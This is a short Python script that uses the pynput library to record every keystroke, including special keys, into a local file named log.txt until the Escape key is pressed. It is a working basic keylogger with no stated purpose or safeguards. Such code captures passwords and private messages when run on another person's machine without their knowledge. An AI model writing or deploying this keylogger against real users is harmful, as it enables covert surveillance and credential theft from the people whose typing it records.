import pynput

from pynput.keyboard import Key,Listener
f=open("log.txt","w")
fil=open("log.txt","a")
def on_press(key):
    k=str(key).replace("'","")
    if k.find("Key")!=-1:
        fil.write("\n")
        fil.write(k)
        fil.write("\n")
    else:
        fil.write(k)

def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
f.close()
fil.close()
